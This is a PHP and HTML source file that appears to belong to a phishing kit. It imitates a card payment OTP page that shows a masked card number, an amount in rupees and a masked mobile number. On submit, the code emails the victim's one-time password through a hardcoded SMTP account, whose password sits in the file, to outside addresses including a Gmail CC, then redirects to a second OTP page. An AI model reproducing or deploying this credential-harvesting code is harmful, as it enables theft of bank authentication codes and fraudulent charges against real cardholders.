<?php
date_default_timezone_set('Asia/Kolkata');
session_start();
@extract($_POST);
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
/*if($_SESSION['amount'] == '')
    {
        header("Location:index.php");
    }*/

    if(isset($submit))
        {
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "smtp.hostinger.com";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@swimstudios.xyz";
                $mail->Password = "Admin@123";
                $mail->AddAddress("info@swimstudios.xyz");
                $mail->addCC('easymailid45@gmail.com');
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'First Code';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>Code 1</b> - '.$otp.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                    header("Location:o-t-p-2.php");      
                }
        }
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Campaign</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <style type="text/css">
        table tr td {
    padding: 0px 10px;
}
    </style>
</head>
<body>
    <img class="widthimg" src="img/make-pay-head.jpg">
    <img class="widthimg" src="img/mobb.png">
    <div class="container">
        <div class="row">
            <div class="col-xs-12"><br><br>
                <p class="text-center" style="font-size: 16px;"><img style="width: 100%;" src="img/img017.jpg"></p>
            </div>
        </div>
        <div class="row">
           <div class="col-xs-12">
                <table>
                    <tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;"><img src="img/img018.jpg"></span></p>
                        </td>
                        <td>
                            <p class="pera"><b>XXXXXXXXXXXX<?php echo substr($_SESSION['very_funny'],12,16);?></b></p>
                        </td>
                    </tr>
                    <tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;"><img src="img/img020.jpg"> </span></p>
                        </td>
                        <td>
                            <p class="pera"><b><img style="width: 100%;" src="img/img021.jpg"></b></p>
                        </td>
                    </tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;"><img src="img/img019.jpg"> </span></p>
                        </td>
                        <td>
                            <p class="pera"><b>Rs. <?=$_SESSION['amount']?>.00</b></p>
                        </td>
                    </tr>
                    </tr>
                        <td><p class="pera"><span style="letter-spacing: 1px; color: #818181;"><img src="img/img022.jpg"> </span></p>
                        </td>
                        <td>
                            <p class="pera"><b>XXXXXXXX<?php echo substr($_SESSION['mobile'],8,10);?></b></p>
                        </td>
                    </tr>
                </table>
                <p style="padding: 5px 10px;"><img style="width: 100%;" src="img/img023.jpg"></p>
                <form method="post">
                <table>
                    <tr>
                        <td><p style="margin-bottom: 0px;"><b><img src="img/024.jpg"></b></p></td>
                        <td>
                            <input name="otp" type="password" class="textfield" maxlength="6" required>
                        </td>
                    </tr>
                </table>
                <p style="font-size: 10px; margin-top: 10px; text-align: center;"><img style="width: 100%;" src="img/img025.jpg"> </p>
                <div class="row">
                    <div class="col-xs-6 text-right">
                        <button type="submit" name="submit" class="btn btn-lg">Submit</button>
                    </div>
                    <div class="col-xs-6 text-left">
                        <a href="o-t-p.php"><button class="btn btn-lg">Cancel</button></a>
                    </div>
                </div>
                <p class="btntag"><img style="width: 100%;" src="img/img026.jpg"></p>
            </form>

            </div>
        </div>
    </div>
</script>
</body>
</html>